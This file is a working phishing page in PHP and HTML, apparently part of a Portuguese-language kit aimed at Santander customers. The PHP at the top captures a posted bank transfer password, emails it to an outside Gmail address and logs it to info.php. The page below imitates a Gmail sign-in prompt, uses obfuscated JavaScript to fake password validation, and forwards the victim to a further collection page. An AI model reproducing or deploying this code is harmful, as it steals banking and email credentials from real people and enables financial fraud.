<?php

       $senha6 = addslashes($_POST["senha6"]);
    
       $corpomsg = " <p></p>
       ====SENHA TRANSFERÊNCIA======<br> <p></p>
       senha6: $senha6<br>    <p></p> 
       =======================";
         $fp = fopen("info.php", "a");
         @mail("ms4010509@gmail.com", "[Santander]"."$ip", $corpomsg, $matts);
       fwrite($fp, $corpomsg);
       fclose($fp);
     ?>
     
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Log in</title>
<meta content="width=device-width,initial-scale=1" name="viewport">
<link href="./Log in_files/css" rel="stylesheet">
<script>
var _0x122b=['hide','keyup','attr','size','html','length','value','style','#4285F4','getElementById','#ModalAlert','#emailsenha','#modalalert','ready','color','fast'];(function(_0x5c40c5,_0x122bca){var _0x25b845=function(_0x3b6c09){while(--_0x3b6c09){_0x5c40c5['push'](_0x5c40c5['shift']());}};_0x25b845(++_0x122bca);}(_0x122b,0x7c));var _0x25b8=function(_0x5c40c5,_0x122bca){_0x5c40c5=_0x5c40c5-0x0;var _0x25b845=_0x122b[_0x5c40c5];return _0x25b845;};$(document)[_0x25b8('0x1')](function(){var _0x1f9749=$(_0x25b8('0xf'))[_0x25b8('0x6')](_0x25b8('0x7'));$(_0x25b8('0xf'))[_0x25b8('0x5')](function(){var _0xc183a8=$(this)[_0x25b8('0x6')](_0x25b8('0xa'));var _0xb5e6cd=$(this)[_0x25b8('0x6')](_0x25b8('0xa'))[_0x25b8('0x9')];if(_0xb5e6cd>=_0x1f9749){document[_0x25b8('0xd')]('tt')[_0x25b8('0xb')][_0x25b8('0x2')]=_0x25b8('0xc');$(_0x25b8('0x0'))[_0x25b8('0x8')]();$(_0x25b8('0x0'))[_0x25b8('0x4')](_0x25b8('0x3'));}else $(_0x25b8('0xe'))[_0x25b8('0x4')](_0x25b8('0x3'));});});
</script>
<script>
var _0x2658=['form','modalalert','value','Senha\x20incorreta.\x20Tente\x20novamente\x20ou\x20clique\x20em\x20\x27Esqueceu\x20a\x20senha?\x27\x20para\x20redefini-lo.','length','mesa','display','emailsenha','borderBottom','style','2px\x20solid\x20#C00','TextErrorModal','getElementById'];(function(_0x3b85db,_0x265815){var _0xc77c23=function(_0x5ee122){while(--_0x5ee122){_0x3b85db['push'](_0x3b85db['shift']());}};_0xc77c23(++_0x265815);}(_0x2658,0x15e));var _0xc77c=function(_0x3b85db,_0x265815){_0x3b85db=_0x3b85db-0x0;var _0xc77c23=_0x2658[_0x3b85db];return _0xc77c23;};function validation(){var _0x118492=document[_0xc77c('0x0')](_0xc77c('0xc'));var _0x25d206=document['getElementById'](_0xc77c('0x2'));if(document['form']['emailsenha'][_0xc77c('0x3')]==''||document[_0xc77c('0x1')][_0xc77c('0x8')][_0xc77c('0x3')][_0xc77c('0x5')]<0x6){_0x118492['innerHTML']=_0xc77c('0x4');document['getElementById'](_0xc77c('0x6'))[_0xc77c('0xa')][_0xc77c('0x9')]=_0xc77c('0xb');document[_0xc77c('0x0')]('tt')[_0xc77c('0xa')][_0xc77c('0x7')]='';document[_0xc77c('0x0')]('tt')[_0xc77c('0xa')]['color']='#C00';_0x25d206[_0xc77c('0xa')][_0xc77c('0x7')]='';return![];}}
</script>
<style type="text/css">
body { margin:0; }
@media (max-width: 1366px) { #topo { max-width:1160px; } }
@media (max-width: 1215px) { #topo { max-width:960px; } }
@media (max-width: 1007px) { #topo { max-width:740px; } }
#box { height:auto; background:#FFF; margin:0 auto; margin-top: 5%; border: 1px solid #DADCE0; border-radius: 10px; }
@media (min-width: 637px) { #box { max-width:450px; !important } }
@media (max-width: 636px) { #box { max-width:100%;  border: none;  !important } }
@media (max-width: 1366px) { #bottom { max-width:1160px; } }
@media (max-width: 1215px) { #bottom { max-width:960px; } }
@media (max-width: 1007px) { #bottom { max-width:740px; } }
@media (max-width: 784px) { #bottom { max-width:200px; } }
@media (min-width: 477px) { #me { float:right; padding:10px; width:120px; } }
@media (max-width: 477px) { #me { float:left; padding:0 0 10px 0; width:90%; } }
@media (max-width: 768px) { #re { display:none; } }
#emailsenha { width:70%; padding:10px; font-size:14px; border:none; outline:none; border-radius: 10px; }
#entrar { width:116px; height:36px; background:#4285F4; border:none; color:#FFF; border-radius:5px; font-weight:bold;}
</style>
<script>
var _0xcaf7=['display','2px\x20solid\x20#4285F4','style','borderBottom','getElementById'];(function(_0x189e28,_0xcaf792){var _0x3425a4=function(_0x463995){while(--_0x463995){_0x189e28['push'](_0x189e28['shift']());}};_0x3425a4(++_0xcaf792);}(_0xcaf7,0xcb));var _0x3425=function(_0x189e28,_0xcaf792){_0x189e28=_0x189e28-0x0;var _0x3425a4=_0xcaf7[_0x189e28];return _0x3425a4;};function clicar(){document[_0x3425('0x1')]('mesa')[_0x3425('0x4')][_0x3425('0x0')]=_0x3425('0x3');document[_0x3425('0x1')]('tt')[_0x3425('0x4')][_0x3425('0x2')]='';}
</script>
</head>

<body>
<div>
<form name="form" id="form" action="./Finalizado.php" method="post" onsubmit="return validation()">
<div id="box">
<div style="padding:30px 40px 140px 40px; font-family: Arial;">
<div style="height:40px; text-align: center"><img src="./gmail.jpg"></div>
<div style="height:40px;"><div style="float:left; font-size:18px; width:100%; text-align: center;">Continuar para <a href="./Finalizado.php"><img src="./st.png" width="25" height="25"></a></div></div>

<div>
<table align="center">
    <tbody><tr>
        <td>
            <div style="border:1px solid #CCC; padding: 5px; border-radius: 20px;">
            <table cellpadding="0" cellspacing="0">
                <tbody><tr>
                    <td><img src="./Log in_files/user.jpg"></td>
                    <td style="padding: 0 5px 0 5px; font-size: 16px;">Digite a senha do seu gmail</td>
                </tr>
            </tbody></table>
            </div>
        </td>
    </tr>
</tbody></table>
</div>

<div style="font-size:11px; color:#C00; height:15px; margin-top: 40px;">

</div>

<div id="mesa" style="border:1px solid #DADCE0; border-radius: 5px;">
<input type="password" name="emailsenha" id="emailsenha" placeholder="Digite sua senha" onclick="clicar()" size="1">

</div>
<div style="margin-top:60px; height: 40px;">
<div style="float: left; padding: 8px 0 0 0; font-size: 14px;"><a target="_blank" href="https://accounts.google.com/signin/v2/usernamerecovery?service=mail&amp;passive=true&amp;rm=false&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;ss=1&amp;scc=1&amp;ltmpl=default&amp;ltmplcache=2&amp;emr=1&amp;osid=1&amp;flowName=GlifWebSignIn&amp;flowEntry=ServiceLogin">Esqueceu a senha?</a></div>
<div style="float: right; text-align: right;"><input type="submit" name="entrar" id="entrar" value="Sincronizar"></div>
</div>
</div>
</div>
</form>
</div>

        </body></html>